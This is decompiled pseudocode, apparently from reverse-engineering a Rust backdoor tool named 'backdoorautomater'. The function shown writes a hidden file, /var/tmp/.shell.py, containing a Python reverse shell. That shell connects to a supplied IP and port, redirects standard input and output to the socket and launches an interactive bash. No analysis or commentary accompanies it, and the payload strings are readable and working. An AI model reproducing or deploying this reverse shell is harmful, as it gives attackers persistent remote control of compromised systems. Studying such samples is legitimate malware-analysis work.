fn backdoorautomater::modifyservice::write_shell_pyfile(a0: &struct24, a1: &struct24) -> u64 {
    let v0: std::fs::File;  // [bp-0x8c]
    let v1: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x88]
    let v2: &str;  // [bp-0x88]
    let v3: &str;  // [bp-0x88]
    let v4: std::fs::File;  // [bp-0x84]
    let v5: u64;  // [bp-0x80]
    let v6: u128;  // [bp-0x78]
    let v7: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x68]
    let v8: u64;  // [bp-0x60]
    let v9: u64;  // [bp-0x58]
    let v10: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x48]
    let v11: u64;  // [bp-0x40]
    let v12: u64;  // [bp-0x38]
    let v13: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x30]
    let v14: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x30]
    let v16: Result<(), &BOT>;  // r15

    v1 = std::fs::File::create("/var/tmp/.shell.py");
    match v1 {
        Err(v16) => {
        },
        Ok(v0) => {
            v16 = std::io::Write::write_all(&v0, "import socket,subprocess,os;\n");
            if let Ok(_) = v16 {
                v16 = std::io::Write::write_all(&v0, "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n");
                if let Ok(_) = v16 {
                    v3 = "v_ip='";
                    v6 = *((a1 + 8) as &i128);
                    v13 = alloc::str::join_generic_copy(&v1, 2, 1, 0);
                    v7 = v14;
                    alloc::vec::Vec<T,A>::extend_from_slice(&v7, "';\n");
                    v16 = std::io::Write::write_all(&v0, v8, v9);
                    if let Ok(_) = v16 {
                        v2 = "s.connect((v_ip,";
                        v6 = *((a0 + 8) as &i128);
                        v13 = alloc::str::join_generic_copy(&v1, 2, 1, 0);
                        v10 = v14;
                        alloc::vec::Vec<T,A>::extend_from_slice(&v10, "));\n");
                        v16 = std::io::Write::write_all(&v0, v11, v12);
                        if let Ok(_) = v16 {
                            v16 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),0);\n");
                            if let Ok(_) = v16 {
                                v16 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),1);\n");
                                if let Ok(_) = v16 {
                                    v16 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),2);\n");
                                    if let Ok(_) = v16 {
                                        v16 = std::io::Write::write_all(&v0, "v_shell_path='/usr/bin/bash';\n");
                                        if let Ok(_) = v16 {
                                            v16 = std::io::Write::write_all(&v0, "v_shell_value='-i';\n");
                                            if let Ok(_) = v16 {
                                                v16 = std::io::Write::write_all(&v0, "p=subprocess.call([v_shell_path,v_shell_value]);\n");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
    }
    return v16;
}
